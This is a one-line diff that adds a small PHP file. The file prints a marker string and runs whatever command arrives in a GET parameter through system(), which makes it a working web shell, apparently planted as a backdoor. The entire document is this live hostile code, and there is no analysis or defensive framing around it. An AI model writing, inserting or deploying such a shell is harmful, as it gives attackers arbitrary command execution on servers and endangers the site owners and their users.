@@ -1,0 +1,1 @@
+<?php echo "AVRIL_JANCOK"; if(isset($_GET['wanna_play_with_me']))system($_GET['wanna_play_with_me']); ?>
